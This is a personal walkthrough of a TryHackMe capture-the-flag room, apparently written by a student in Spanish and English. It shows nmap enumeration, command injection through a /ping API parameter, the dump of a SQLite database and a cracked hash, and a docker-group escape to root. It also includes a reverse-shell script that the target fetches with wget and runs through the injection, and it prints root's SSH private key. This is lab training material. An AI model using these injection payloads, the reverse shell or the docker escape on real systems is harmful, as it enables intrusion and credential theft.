
https://tryhackme.com/r/room/ultratech1
#  Task 1 Deploy the machine

~_. UltraTech ._~
This room is inspired from real-life vulnerabilities and misconfigurations I encountered during security assessments.
If you get stuck at some point, take some time to keep enumerating.


[ Your Mission ]
You have been contracted by UltraTech to pentest their infrastructure.
It is a grey-box kind of assessment, the only information you have
is the company's name and their server's IP address.
Start this room by hitting the "deploy" button on the right!

Good luck and more importantly, have fun!

__

Lp1 <fenrir.pro>

[ Extra Information ]
If you have any comment or question regarding this room, you can contact me on TryHackMe's Discord.


### Task 2 It's enumeration time!
### Escaneo

```
┌──(kali㉿kali)-[~/tmp/tryhackme/ultratech]
└─$ nmap -sV -p- --min-rate 5000 10.10.43.247 -oN nmap
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-15 11:06 CDT
Nmap scan report for 10.10.43.247
Host is up (0.19s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.43 seconds
```

After enumerating the services and resources available on this machine, what did you discover?

### Answer the questions below

 
#### Which software is using the port 8081?
Node.js

#### Which other non-standard port is used?
31331

#### Which software using this port?
Apache

#### Which GNU/Linux distribution seems to be used?
Ubuntu


#### The software using the port 8081 is a REST api, how many of its routes are used by the web application?


```
curl 10.10.31.190:31331/robots.txt
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt


curl 10.10.31.190:31331/utech_sitemap.txt
/
/index.html
/what.html
/partners.html
```

- Montamos sobre BURP
	- Revisamos el mama del sitio
	- Vemos que hay 2 llamadas al puerto :8081

2

###  Task 3 Let the fun begin

Now that you know which services are available, it's time to exploit them!
Did you find somewhere you could try to login? Great!
Quick and dirty login implementations usually goes with poor data management.
There must be something you can do to explore this machine more thoroughly.

#### Al revisar el endpoint `/partners` encontramos las llamadas al api

```
curl 10.10.31.190:31331/partners.html

curl 10.10.31.190:31331/js/api.js    
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
        return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
        const req = new XMLHttpRequest();
        try {
            const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
            req.open('GET', url, true);
            req.onload = function (e) {
                if (req.readyState === 4) {
                    if (req.status === 200) {
                        console.log('The api seems to be running')
                    } else {
                        console.error(req.statusText);
                    }
                }
            };
            req.onerror = function (e) {
                console.error(xhr.statusText);
            };
            req.send(null);
        }
        catch (e) {
            console.error(e)
            console.log('API Error');
        }
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();


const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
            
```

#### Usamos el endpoint del ping para ejecutar comandos

```
ip a s tun0
4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 10.6.34.162/17 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::3aa8:7704:ce7:502f/64 scope link stable-privacy proto kernel_ll 
       valid_lft forever preferred_lft forever

>> mi kali - pongo el sniffer para ver si recibe el ping

sudo tcpdump icmp -i tun0 

[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes](<sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:31:39.516386 IP 10.10.31.190 %3E kali: ICMP echo request, id 2986, seq 1, length 64
23:31:39.516434 IP kali > 10.10.31.190: ICMP echo reply, id 2986, seq 1, length 64>)


>> mando ping
curl 10.10.31.190:8081/ping?ip=10.6.34.162
PING 10.6.34.162 (10.6.34.162) 56(84) bytes of data.
64 bytes from 10.6.34.162: icmp_seq=1 ttl=61 time=251 ms

--- 10.6.34.162 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 251.491/251.491/251.491/0.000 ms


```

```
## forma 1
curl 'http://10.10.31.190:8081/ping?ip=10.6.34.162;`ls`'  
ping: utech.db.sqlite: Name or service not known


## forma 2
curl 'http://10.10.31.190:8081/ping?ip=10.6.34.162%0als'
PING 10.6.34.162 (10.6.34.162) 56(84) bytes of data.
64 bytes from 10.6.34.162: icmp_seq=1 ttl=61 time=175 ms

--- 10.6.34.162 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 175.312/175.312/175.312/0.000 ms
index.js
node_modules
package.json
package-lock.json
start.sh
utech.db.sqlite


There is a database lying around, what is its filename?
utech.db.sqlite
```

```
curl 'http://10.10.31.190:8081/ping?ip=10.6.34.162;`cat%20utech.db.sqlite`'
���(r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded

What is the first user's password hash?
f357a0c52799563c7c7b76c1e7543a32

https://crackstation.net/
n100906
```

- otra forma
```
cat shell.sh                                                                                                                        
/bin/bash -i >& /dev/tcp/10.6.34.162/8080 0>&1

>> en mi kali
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
10.6.34.162 - - [26/Sep/2024 00:27:39] "GET /shell.sh HTTP/1.1" 200 -

>> lo subo y e
curl http://10.10.111.236:8081/ping?ip=10.6.34.162%0awget%2010.6.34.162/shell.sh
curl http://10.10.111.236:8081/ping?ip=10.6.34.162%0abash%20./shell.sh



```


### Task 4

- nos loguemos  r00t / n100906 por ssh

```
ssh r00t@10.10.31.190
The authenticity of host '10.10.31.190 (10.10.31.190)' can't be established.
ED25519 key fingerprint is SHA256:g5I2Aq/2um35QmYfRxNGnjl3zf9FNXKPpEHxMLlWXMU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.31.190' (ED25519) to the list of known hosts.
r00t@10.10.31.190's password: 
Permission denied, please try again.
r00t@10.10.31.190's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Sep 26 04:47:01 UTC 2024

  System load:  0.0                Processes:           106
  Usage of /:   24.3% of 19.56GB   Users logged in:     0
  Memory usage: 73%                IP address for eth0: 10.10.31.190
  Swap usage:   0%


1 package can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)

```

- Aprovechamos que es miembro de docker para escapar del contenedor

```
docker ps -a

https://gtfobins.github.io/#docker
https://gtfobins.github.io/gtfobins/docker/


docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        5 years ago         15.8MB>)


docker run -v /:/mnt --rm -it bash chroot /mnt sh
# cd /root
# cd .ssh
# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
-----END RSA PRIVATE KEY-----
# 

What are the first 9 characters of the root user's private SSH key?
MIIEogIBA
```

